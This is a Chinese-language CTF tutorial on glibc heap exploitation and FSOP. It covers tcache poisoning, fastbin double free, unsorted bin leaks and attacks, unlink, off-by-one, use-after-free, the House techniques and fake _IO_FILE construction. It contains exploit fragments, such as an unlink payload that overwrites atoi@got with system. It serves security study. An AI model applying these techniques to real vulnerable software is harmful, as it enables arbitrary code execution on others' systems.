# 堆利用与 FSOP 题型解法

## 题型识别

堆题最常见外观是菜单程序：

```text
1. add / create
2. delete / free
3. edit / change
4. show / print
5. exit
```

重点关注：

- `add`：申请大小是否可控，是否限制最大值，是否保存 size。
- `delete`：是否清空指针，是否允许 double free。
- `edit`：是否校验 index，是否校验 size，能否越界写或 UAF 写。
- `show`：是否能打印 free 后内容，用于 leak。
- libc 版本：决定是否有 tcache、safe-linking、hook、unlink check 等。

堆题通用目标：

- 泄露 libc：unsorted bin、FILE、GOT、堆残留指针。
- 泄露 heap：tcache/fastbin 链表、UAF show。
- 任意地址分配：tcache poisoning、fastbin attack。
- 任意地址写：unlink、unsorted bin attack、large bin attack、tcache poisoning 后写目标。
- 劫持控制流：`__free_hook`、`__malloc_hook`、GOT、vtable、`_IO_list_all`、返回地址。

## 堆基础

堆是程序虚拟地址空间中用于动态分配内存的一块连续线性区域，一般从低地址向高地址增长。堆管理器处于用户程序和内核之间，主要负责：

1. 响应用户申请内存的请求，向操作系统申请内存并返回给程序。
2. 管理用户释放的内存。释放的内存通常不会立即还给操作系统，而是被堆管理器管理，用来响应新的申请。

glibc 中的堆分配器是 ptmalloc2，主要接口是 `malloc/free`。背后的系统调用主要是：

- `brk/sbrk`：调整 program break，扩展传统 heap。
- `mmap/munmap`：创建独立匿名映射，常用于大 chunk。

需要注意的内存管理思想：只有真正访问一个地址时，系统才建立虚拟页面与物理页面的映射关系。

## chunk 结构

ptmalloc 内部用 `malloc_chunk` 表示 chunk：

```c
struct malloc_chunk {
  INTERNAL_SIZE_T      prev_size;
  INTERNAL_SIZE_T      size;
  struct malloc_chunk* fd;
  struct malloc_chunk* bk;
  struct malloc_chunk* fd_nextsize;
  struct malloc_chunk* bk_nextsize;
};
```

字段含义：

- `prev_size`：前一个物理相邻 chunk 空闲时，记录前一个 chunk 大小。
- `size`：当前 chunk 大小，低三位为标志位：
  - `NON_MAIN_ARENA`
  - `IS_MAPPED`
  - `PREV_INUSE`
- `fd/bk`：free chunk 进入链表后使用的前后指针。
- `fd_nextsize/bk_nextsize`：large bin 中按大小排序时使用。

已分配 chunk：

```text
chunk -> prev_size
         size |A|M|P|
mem   -> user data
next  -> prev_size 可能被当前 chunk 复用
         size
```

free chunk：

```text
chunk -> prev_size
         size
mem   -> fd
         bk
         unused
next  -> prev_size
         size
```

常用宏：

```c
#define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char *) (mem) - 2 * SIZE_SZ))
```

利用时必须记住：`malloc` 返回的是 user data 起始地址，不是 chunk header 起始地址。

## tcache

glibc 2.26 引入 tcache。每个线程有一个 `tcache_perthread_struct`：

```c
typedef struct tcache_entry {
  struct tcache_entry *next;
} tcache_entry;

typedef struct tcache_perthread_struct {
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

核心函数：

```c
static void tcache_put(mchunkptr chunk, size_t tc_idx) {
  tcache_entry *e = (tcache_entry *) chunk2mem(chunk);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

static void *tcache_get(size_t tc_idx) {
  tcache_entry *e = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

重要点：

- 一个 tcache bin 默认最多 7 个 chunk。
- `free` 时小 chunk 优先进入 tcache。
- `malloc` 开始时先查 tcache，有就直接取。
- 早期 tcache 检查比 fastbin 更少，覆盖 `next` 就容易任意地址分配。

### tcache poisoning

核心思想：覆盖 tcache 中 free chunk 的 `next` 指针，让下一次 `malloc` 返回攻击者指定地址。

条件：

- 能写 free 后 chunk 的 user data，典型是 UAF。
- 目标地址能通过当前 libc 的对齐和 safe-linking 检查。
- 分配大小必须落在同一个 tcache bin。

基本流程：

```text
malloc A
free A
edit A.next = target
malloc size -> 返回 A
malloc size -> 返回 target
```

伪代码：

```python
add(size, b"A")
delete(0)
edit(0, p64(target_addr))
add(size, b"B")
add(size, p64(value))  # 写 target_addr
```

常见目标：

- `__free_hook = system`
- `__malloc_hook = one_gadget`，适用于旧 libc。
- `exit_hook`、栈返回地址、全局函数指针。

safe-linking 后，tcache `next` 会被异或保护，通常需要先泄露 heap 地址，再按规则编码伪造指针。

## fastbin

fastbin attack 是基于 fastbin 单链表机制的一类利用。前提：

- 存在堆溢出、UAF 等能控制 chunk 内容的漏洞。
- 漏洞发生在 fastbin 大小范围内。

常见分类：

- Fastbin Double Free
- House of Spirit
- Alloc to Stack
- Arbitrary Alloc

fastbin 的关键机制：

- 使用单链表维护释放 chunk。
- fastbin chunk 被释放后，下一个 chunk 的 `PREV_INUSE` 位不会被清空。
- `free` 时只检查 fastbin 链表头是否等于当前释放块，对链表后面的重复块不检查。

### fastbin double free

直接：

```c
free(chunk1);
free(chunk1);
```

会触发：

```text
double free or corruption (fasttop)
```

但如果插入另一个 chunk：

```c
free(chunk1);
free(chunk2);
free(chunk1);
```

链表变为：

```text
fastbin -> chunk1 -> chunk2 -> chunk1
```

之后如果能控制 `chunk1->fd`，就能让后续 `malloc` 分配到伪造地址。

典型流程：

```text
free A
free B
free A
malloc -> A
write A.fd = fake_chunk
malloc -> B
malloc -> A
malloc -> fake_chunk
```

注意：`_int_malloc` 会检查目标位置的 size 是否与当前 fastbin 尺寸匹配，因此 fake chunk 附近需要伪造合适的 size 字段，例如 `0x21`、`0x71`。

## unsorted bin

### unsorted bin 来源

unsorted bin 常见来源：

1. 较大 chunk 被分割后，剩余部分大于 MINSIZE，会放入 unsorted bin。
2. 释放一个不属于 fastbin 的 chunk，且不与 top chunk 相邻时，先进入 unsorted bin。
3. `malloc_consolidate` 合并后的 chunk，如果不和 top chunk 相邻，也可能进入 unsorted bin。

使用特征：

- 插入时放到 unsorted bin 头部。
- 取出时从链表尾获取，整体表现为 FIFO。
- malloc 找不到合适 fastbin/smallbin 时，会尝试从 unsorted bin 找。

### unsorted bin leak

unsorted bin 是循环双向链表。链表中的 `fd/bk` 会指向 `main_arena` 附近。如果能 UAF show 一个进入 unsorted bin 的 chunk，就能泄露 main_arena，从而计算 libc 基址。

常见条件：

- 能申请一个大于 fastbin/tcache 范围的 chunk。
- free 后仍能 show。
- unsorted bin 比较干净，只有一个 chunk 时 `fd` 和 `bk` 都指向 main_arena。

计算：

```python
leak = u64(show_data.ljust(8, b"\x00"))
libc_base = leak - main_arena_offset
```

main_arena 偏移可以通过：

- IDA 分析 `malloc_trim` 中对 `main_arena` 的访问。
- 旧版本中用 `__malloc_hook + 0x10` 估算。

### unsorted bin attack

前提：能控制 unsorted bin chunk 的 `bk` 指针。

效果：把 `unsorted_chunks(av)` 这个较大的 libc 地址写入到任意地址，常用于改 `global_max_fast` 或为后续攻击做准备。

关键源码：

```c
if (__glibc_unlikely (bck->fd != victim))
  malloc_printerr ("malloc(): corrupted unsorted chunks 3");
unsorted_chunks(av)->bk = bck;
bck->fd = unsorted_chunks(av);
```

如果控制：

```text
victim->bk = target - 0x10   # 64 位
```

取出 victim 时会执行：

```text
*(target) = unsorted_chunks(av)
```

注意：这不是任意值写，而是写入一个 main_arena 附近的大数值。目标地址也要满足检查条件。

## unlink

unlink 的目的，是把一个双向链表中的空闲块取出来，例如 free 时和物理相邻 free chunk 合并。

古老 unlink 没有完整检查时，可以通过伪造 `fd/bk` 实现近似任意写：

```text
FD = P->fd = target - 0x18
BK = P->bk = expect_value
FD->bk = BK
BK->fd = FD
```

现代 glibc 有检查：

```c
if (chunksize(P) != prev_size(next_chunk(P)))
  malloc_printerr("corrupted size vs. prev_size");

if (FD->bk != P || BK->fd != P)
  malloc_printerr("corrupted double-linked list");
```

当前 unlink 利用思路是伪造 `FD/BK` 绕过检查，让“指向 chunk 的全局指针”被改到自身附近，从而获得任意地址读写能力。

条件：

1. UAF 或堆溢出，可修改 free 状态 smallbin/unsorted bin 的 `fd/bk`。
2. 已知位置存在一个指针 `ptr` 指向可触发 unlink 的 chunk。

效果：

```text
ptr 处的指针变为 ptr - 0x18
```

64 位典型构造：

```python
ptr = 0x6020c8

fake = p64(0)          # prev_size
fake += p64(0x41)     # fake chunk size
fake += p64(ptr - 0x18)
fake += p64(ptr - 0x10)
fake += b"A" * 0x20
fake += p64(0x40)     # next.prev_size
fake += p64(0x90)     # clear PREV_INUSE
```

触发：

```python
edit(0, fake)
delete(1)
```

之后可以把 chunk 指针数组改造成指向 GOT：

```python
payload = p64(0) * 2 + p64(0x40) + p64(atoi_got)
edit(0, payload)
show()
```

再泄露 libc，计算 `system`，把 `atoi@got` 改为 `system`，输入 `/bin/sh`。

## off-by-one

off-by-one 是写入时多写一个字节。堆题中常见原因：

- 循环条件写成 `i <= size`。
- `strlen` 不统计 `\x00`，但 `strcpy` 会复制结束符。
- 读入 size 计算错误。

堆上的 off-by-one 虽然只越界 1 字节，但可能覆盖下一个 chunk 的 `prev_size` 或 `size` 低字节。

利用思路：

1. 溢出字节可控：修改 size 造成 chunk overlap，从而泄露或覆盖其他 chunk。
2. 溢出字节为 `\x00`：如果下一个 chunk size 低字节被清零，可能清除 `PREV_INUSE` 位，触发向后合并或 unlink。

典型漏洞：

```c
for (i = 0; i <= size; i++) {
    ptr[i] = getchar();
}
```

字符串场景：

```c
if (strlen(buffer) == 24) {
    strcpy(chunk1, buffer);
}
```

`strlen` 返回 24，但 `strcpy` 会复制 25 字节，包括结尾 `\x00`，导致 NULL byte off-by-one。

glibc 2.29 后加入：

```c
if (__glibc_unlikely (chunksize(p) != prevsize))
  malloc_printerr ("corrupted size vs. prev_size while consolidating");
```

这会限制传统 off-by-null，但仍可结合 large bin 遗留指针、fake chunk、overlap 等方式绕过。

## use-after-free

UAF 是释放后仍可使用旧指针。菜单题里常见：

```c
free(ptr[index]);
// 没有 ptr[index] = NULL
```

之后 `show(index)`、`edit(index)` 仍可读写 free chunk。利用方向：

- UAF show：泄露 tcache/fastbin/unsorted 指针。
- UAF edit：覆盖 `fd/next`，做 tcache poisoning 或 fastbin attack。
- 类型混淆：同一块内存被不同结构重新申请，旧指针按旧类型解释新数据。

基本套路：

```text
add A
delete A
show A      -> leak
edit A      -> poison next/fd
add same size
add same size -> target
```

## House 系列速查

House 系列技巧可按利用特征归类：

- House of Force：覆盖 top chunk size 为极大值，下一次 malloc 计算距离，分配到目标地址。
- House of Einherjar：利用 off-by-null 和伪造 `prev_size` 触发 backward consolidation，制造 overlap。
- House of Lore：smallbin 攻击，伪造链表使 malloc 返回栈或目标区域。
- House of Orange：通常与 top chunk、unsorted bin、IO_FILE/FSOP 组合。
- House of Rabbit、Roman、Pig：更复杂，依赖特定 libc 和分配器状态。

遇到 House 题时先判断：

- 能否改 top chunk size。
- 能否伪造 `prev_size` 和 `PREV_INUSE`。
- 能否控制 smallbin/largebin 指针。
- libc 版本是否支持对应技巧。

## FSOP

FSOP 是 File Stream Oriented Programming。进程内所有 `_IO_FILE` 结构会通过 `_chain` 域连接成链表，链表头由 `_IO_list_all` 维护。FSOP 的核心是劫持 `_IO_list_all`，伪造链表和 `_IO_FILE` 项，再通过系统路径触发虚表调用。

常见触发函数是 `_IO_flush_all_lockp`。它会刷新 `_IO_list_all` 链表中所有文件流，相当于对每个 FILE 调用 `fflush`，最终调用 `_IO_FILE_plus.vtable` 中的 `_IO_overflow`。

关键条件：

```c
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
    && _IO_OVERFLOW(fp, EOF) == EOF) {
    result = EOF;
}
```

因此 fake FILE 至少要满足：

- `fp->_mode <= 0`
- `fp->_IO_write_ptr > fp->_IO_write_base`
- vtable 指向可控区域或可用的合法 vtable 绕过检查
- `_IO_overflow` 位置为目标函数或 gadget

`_IO_flush_all_lockp` 常见触发点：

1. libc 执行 abort 流程。
2. 执行 `exit`。
3. 执行流从 `main` 返回。

基础构造：

```c
#define mode_offset 0xc0
#define writeptr_offset 0x28
#define writebase_offset 0x20
#define vtable_offset 0xd8

ptr = malloc(0x200);

*(long long*)((long long)ptr + mode_offset) = 0;
*(long long*)((long long)ptr + writeptr_offset) = 1;
*(long long*)((long long)ptr + writebase_offset) = 0;
*(long long*)((long long)ptr + vtable_offset) = (long long)ptr + 0x100;

*(long long*)((long long)ptr + 0x100 + 24) = 0x41414141;
_IO_list_all = ptr;
exit(0);
```

CTF 中通常不会直接写 `_IO_list_all`，而是通过 unsorted bin attack、large bin attack 或任意写实现。新版 glibc 对 vtable 有更多检查，常改用：

- `fake _IO_FILE_plus` + 合法 vtable 附近偏移。
- `setcontext` 栈迁移。
- `house of orange` 变体。
- old libc 中直接打 `_IO_list_all`。

## 堆题完整思路

建议按以下顺序分析：

1. 记录 libc 版本和保护：tcache、safe-linking、RELRO、hook 是否存在。
2. 逆菜单逻辑：每个 index、size、指针数组、结构体字段。
3. 找 bug：
   - UAF
   - double free
   - overflow/off-by-one
   - arbitrary free
   - size mismatch
   - negative index / integer overflow
4. 设计 leak：
   - unsorted bin leak libc
   - UAF show leak heap
   - GOT/FILE leak
5. 设计 write/alloc：
   - tcache poisoning
   - fastbin attack
   - unlink
   - large/unsorted bin attack
6. 劫持控制流：
   - `__free_hook = system`
   - GOT overwrite
   - FILE/FSOP
   - setcontext + ORW
7. 稳定远程：处理输入换行、截断、tcache 填满、one_gadget 约束、不同 libc 偏移。
